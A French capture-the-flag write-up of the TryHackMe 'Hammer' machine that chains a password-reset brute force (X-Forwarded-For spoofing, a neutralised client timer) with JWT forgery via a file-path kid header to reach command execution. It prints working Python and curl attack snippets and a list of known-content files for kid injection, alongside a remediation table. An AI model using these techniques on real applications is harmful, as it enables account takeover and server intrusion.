## La machine

Hammer tombe par une chaîne purement applicative : aucune CVE, aucun exploit public, uniquement des contrôles de sécurité délégués au client et un JWT dont le client choisit la clé de signature.

| | |
| --- | --- |
| Plateforme | TryHackMe |
| Cible | 10.129.168.161 |
| Services | SSH (22), HTTP (1337) |
| Date | 1er octobre 2026 |
| Durée | ~1 h 10 (14:50 → 16:00) |

Deux flags récupérés :

| Flag | Obtention |
| --- | --- |
| `THM{AuthBypass3D}` | Prise de contrôle du compte via le reset de mot de passe |
| `THM{RUNANYCOMMAND1337}` | `/home/ubuntu/flag.txt`, lu en tant que `www-data` |

## La chaîne en un coup d'œil

```mermaid
flowchart LR
    A["Dev Note<br/><i>préfixe hmr_</i>"] --> B["error.logs exposé<br/><i>email valide confirmé</i>"]
    B --> C["Code à 4 chiffres<br/><i>10 000 possibilités</i>"]
    C --> D["Timer côté client<br/><i>s= vide</i>"]
    D --> E["Rate limit sur en-tête<br/><i>X-Forwarded-For varié</i>"]
    E --> F["Compte pris<br/><i>flag 1</i>"]
    F --> G["JWT en dur<br/><i>kid = chemin fichier</i>"]
    G --> H["Clé choisie<br/><i>/proc/sys/kernel/ostype</i>"]
    H --> I["Token forgé<br/><i>role: admin</i>"]
    I --> J["RCE www-data<br/><i>flag 2</i>"]

    style J fill:#dbeafe,stroke:#2563eb,stroke-width:2px
```



Aucune étape n'exploite une faille logicielle : chacune repose sur un contrôle de sécurité dont la donnée décisive est fournie par le client.

## Reconnaissance

Deux ports ouverts seulement, et tout se joue sur le 1337.

```bash
nmap -sC -sV -p- -T4 10.129.168.161
```

| Port | Service | Version |
| --- | --- | --- |
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
| 1337/tcp | http | Apache httpd 2.4.41 (Ubuntu) |

SSH en 8.2p1 sans vulnérabilité exploitable : la surface d'attaque est la seule application web. Le titre de la page est « Login » et le serveur pose un cookie `PHPSESSID`, donc application PHP.

Détail relevé dès ce stade et réutilisé bien plus tard : nmap signale que le cookie de session n'a pas le flag `HttpOnly`. Le JavaScript peut donc lire et écrire la session.

## Énumération web

Le code source de la page de login contient un commentaire laissé par un développeur :

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

Cette note est la clé de l'énumération : une wordlist classique ne trouve rien, car tous les répertoires portent le préfixe `hmr_`. Gobuster permet de préfixer chaque mot via un fichier de motif.

```bash
echo 'hmr_{GOBUSTER}' > pattern.txt
gobuster dir -u http://10.129.168.161:1337 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -p pattern.txt -t 50
```

| Chemin | Code | Intérêt |
| --- | --- | --- |
| `/hmr_logs/` | 301 | Logs applicatifs exposés |
| `/hmr_images/` | 301 | — |
| `/hmr_css/` | 301 | — |
| `/hmr_js/` | 301 | — |
| `/vendor/` | 301 | Dépendances Composer |
| `/phpmyadmin/` | 301 | — |
| `/server-status` | 403 | Accès refusé |

Le formulaire de login expose aussi un lien vers `reset_password.php`, qui deviendra le vecteur d'entrée.

## Fuite d'information via les logs

Le fichier `/hmr_logs/error.logs` est lisible sans authentification. Ce sont des logs d'erreur Apache datés d'août 2024.

Deux lignes se distinguent, toutes deux liées à des échecs d'authentification :

| Endpoint | Code Apache | Message |
| --- | --- | --- |
| `/restricted-area` | AH01631 | Password Mismatch |
| `/admin-login` | AH01617 | Invalid email address |

La différence entre les deux messages est l'information exploitable. Un « Password Mismatch » signifie que l'adresse `tester@hammer.thm` a été reconnue et que seul le mot de passe était faux : **l'email existe en base**.

Les logs révèlent aussi le domaine interne `hammer.thm` et plusieurs chemins système (`/var/www/html/protected`, `/var/www/html/locked-down`, `/home/hammerthm/test.php`). Vérification faite plus tard depuis la machine, le répertoire `hammerthm` n'existe pas : c'est du décor.

## Contournement du reset de mot de passe

Avec un email valide, `reset_password.php` demande un code de récupération à **4 chiffres**, soit 10 000 combinaisons. Deux protections encadrent ce code, et toutes deux sont contournables.

### Le timer est côté client

La page affiche un compte à rebours de 180 secondes et poste un champ caché `s` à chaque tentative. Ce champ est piloté par du JavaScript dans le navigateur :

```javascript
let countdownv = 170;
// setInterval : countdownv--; hiddenField.value = countdownv;
// si countdownv <= 0 → window.location.href = 'logout.php'
```

En envoyant `s=` vide, la valeur est réinjectée telle quelle dans le script renvoyé (`let countdownv = ;`), qui plante. Plus de redirection automatique vers `logout.php`.

Attention toutefois : le serveur conserve sa **propre** fenêtre d'expiration. Une première tentative via Burp Intruder, lancée trop tard, n'a renvoyé que des `302` vers `logout.php` avec le message « Time elapsed ». Casser le timer client ne suspend pas le compteur serveur.

### Le rate limiting se fie à un en-tête client

La réponse expose un en-tête `Rate-Limit-Pending` qui décroît à chaque essai. En faisant varier un seul paramètre à la fois, on identifie ce sur quoi le compteur est indexé :

| Requête | Rate-Limit-Pending |
| --- | --- |
| Session en cours | 4 |
| Nouveau PHPSESSID | 6 |
| `X-Forwarded-For: 1.2.3.4` ajouté | 9 |

Le compteur repart au maximum dès qu'un `X-Forwarded-For` différent est envoyé : l'application lit l'IP du client depuis cet en-tête, que le client contrôle entièrement.

### Brute-force

Les trois conditions sont réunies : timer neutralisé, rate limiting inopérant, espace de 10 000 codes. Burp Community étant throttlé, un script Python threadé fait le travail dans la fenêtre serveur.

```python
requests.post(url,
    data={"recovery_code": code, "s": ""},
    headers={"X-Forwarded-For": new_xff()},
    cookies={"PHPSESSID": sid})
```

Le code `2496` est trouvé après environ 2 500 tentatives, largement dans les 180 secondes. Le discriminant : une réponse de 2188 octets au lieu de 2196, l'écart correspondant au bloc d'erreur absent.

## Prise de contrôle du compte

Le code validé donne accès au formulaire « Reset Your Password ». Pour y arriver sans relancer toute la procédure, il suffit de réinjecter la session trouvée par le script dans le navigateur — possible parce que `PHPSESSID` n'a pas le flag `HttpOnly`, relevé dès le scan nmap.

```javascript
document.cookie = "PHPSESSID=f9d21vpe0t31jtsnp8ev02l1jr; path=/";
```

Après changement du mot de passe, la connexion mène à `/dashboard.php` :

> **`THM{AuthBypass3D}`**

La page accueille l'utilisateur « Thor » avec le rôle `user` et propose un champ d'exécution de commandes. Elle se déconnecte en boucle, à cause d'un contrôle là encore purement client :

```javascript
function checkTrailUserCookie() {
    if (!getCookie('persistentSession')) {
        window.location.href = 'logout.php';
    }
}
setInterval(checkTrailUserCookie, 1000);
```

Poser le cookie `persistentSession` suffit à s'en débarrasser. Mieux : travailler directement en curl, où aucun JavaScript ne s'exécute.

## Forge de JWT via le paramètre kid

Le JavaScript du dashboard contient un JWT en dur, envoyé en `Authorization: Bearer` vers `execute_command.php`. Son décodage révèle les deux champs qui comptent.

```json
// Header
{"typ":"JWT","alg":"HS256","kid":"/var/www/mykey.key"}

// Payload
{"iss":"http://hammer.thm","aud":"http://hammer.thm",
 "iat":1790861869,"exp":1790865469,
 "data":{"user_id":1,"email":"tester@hammer.thm","role":"user"}}
```

Le champ `role` dit quoi modifier. Le champ `kid` dit comment : il contient un **chemin de fichier**. Le serveur lit ce fichier et utilise son contenu comme clé HMAC. Comme le client choisit ce chemin, il suffit de le pointer vers un fichier dont on connaît le contenu pour pouvoir signer soi-même n'importe quel payload.

### Deux tentatives

`kid: /dev/null` paraît idéal — contenu vide, donc clé vide et connue. Le serveur répond :

```json
{"error":"Invalid token: Key material must not be empty"}
```

L'échec est instructif : la bibliothèque refuse une clé vide, mais le fichier a bien été lu. La lecture arbitraire fonctionne, il faut juste un contenu non vide et prévisible.

`/proc/sys/kernel/ostype` contient exactement `Linux\n` sur toute machine Linux. Le saut de ligne final compte dans le HMAC.

```python
header = {"typ": "JWT", "alg": "HS256", "kid": "/proc/sys/kernel/ostype"}
payload["data"]["role"] = "admin"
sig = hmac.new(b"Linux\n", signing_input, hashlib.sha256).digest()
```

### Un prérequis découvert en chemin

Envoyé seul, le token forgé renvoie un `302` vers `logout.php` : l'endpoint vérifie **aussi** la session PHP, avant même de regarder le JWT. Les cookies sont indispensables.

```bash
curl -i -X POST http://10.129.168.161:1337/execute_command.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -b "PHPSESSID=a5c838goa6l081v10me4lm1vti; persistentSession=1" \
  -d '{"command":"id"}'
```

```json
{"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

Exécution de commandes obtenue en tant que `www-data`.

## Post-exploitation

Une fonction shell évite de retaper la requête à chaque commande :

```bash
cmd() {
  curl -s -X POST http://10.129.168.161:1337/execute_command.php \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -b "PHPSESSID=a5c838goa6l081v10me4lm1vti; persistentSession=1" \
    -d "{\"command\":\"$1\"}"
}
```

`/home` ne contient qu'un seul utilisateur, `ubuntu`, et son flag est lisible directement par `www-data` :

```console
$ cmd "cat /home/ubuntu/flag.txt"
{"output":"THM{RUNANYCOMMAND1337}\n"}
```

> **`THM{RUNANYCOMMAND1337}`**

## Vulnérabilités et remédiations

| # | Vulnérabilité | Classification | Remédiation |
| --- | --- | --- | --- |
| 1 | Commentaire de développeur révélant la convention de nommage | CWE-615 | Retirer les commentaires internes du code livré |
| 2 | Logs applicatifs accessibles publiquement | CWE-532 | Stocker les logs hors de la racine web |
| 3 | Messages d'erreur distinguant email valide et invalide | CWE-204 | Message générique unique quelle que soit la cause |
| 4 | Code de récupération à 4 chiffres | CWE-330 | Jeton cryptographiquement aléatoire d'au moins 128 bits |
| 5 | Expiration de session gérée côté client | CWE-602 | Horodatage en session serveur, le client n'est qu'un affichage |
| 6 | Rate limiting indexé sur `X-Forwarded-For` | CWE-290 | Utiliser l'IP de la connexion, ou valider l'en-tête contre une liste de proxies de confiance |
| 7 | Cookie de session sans `HttpOnly` | CWE-1004 | Flags `HttpOnly`, `Secure` et `SameSite` |
| 8 | JWT exposé en clair dans le JavaScript | CWE-522 | Ne jamais livrer de secret au client |
| 9 | `kid` utilisé comme chemin de fichier sans validation | CWE-22 / CWE-347 | Whitelist d'identifiants de clés, jamais de chemin fourni par le client |
| 10 | Rôle lu depuis le JWT sans vérification serveur | CWE-863 | Vérifier les droits en base à chaque requête |
| 11 | Exécution de commandes exposée à l'application web | CWE-78 | Supprimer la fonctionnalité, ou whitelist stricte |

Les vulnérabilités 5, 6 et 10 relèvent du même défaut de conception : **des décisions de sécurité déléguées à une donnée que le client contrôle**. C'est ce qui rend la chaîne exploitable de bout en bout.

## Points de méthode

**Lire les commentaires du code source.** Sans la Dev Note, l'énumération de répertoires ne donnait rien : aucune wordlist classique ne teste le préfixe `hmr_`. L'option `--pattern` de gobuster transforme cette information en attaque.

**Faire varier un paramètre à la fois.** L'identification du rate limiting a tenu en trois requêtes : session en cours, nouvelle session, puis ajout de `X-Forwarded-For`. Changer deux choses d'un coup aurait masqué le résultat.

**Un message d'erreur est une information.** « Key material must not be empty » confirme que le fichier pointé par `kid` a été lu. L'échec valide le mécanisme et oriente directement vers la bonne cible.

**Vérifier si le contrôle existe côté serveur.** Le timer cassé côté client donnait l'illusion d'avoir tout le temps. Le serveur maintenait sa propre fenêtre, et la première tentative de brute-force a échoué sur ce point.

**Distinguer les couches d'authentification.** L'endpoint RCE vérifiait session PHP *et* JWT. Un token parfaitement forgé renvoyait un `302` tant que les cookies manquaient — symptôme facile à confondre avec un problème de signature.

**Fichiers à contenu connu, pour un `kid` injectable :**

| Chemin | Contenu |
| --- | --- |
| `/proc/sys/kernel/ostype` | `Linux\n` |
| `/proc/sys/kernel/randomize_va_space` | `2\n` |
| `/dev/null` | vide — refusé par la plupart des bibliothèques JWT |
| `/etc/hostname` | variable, à lire d'abord |

Ecrit par [Clément MONCHAUX](https://tryhackme.com/p/clem.mchx)
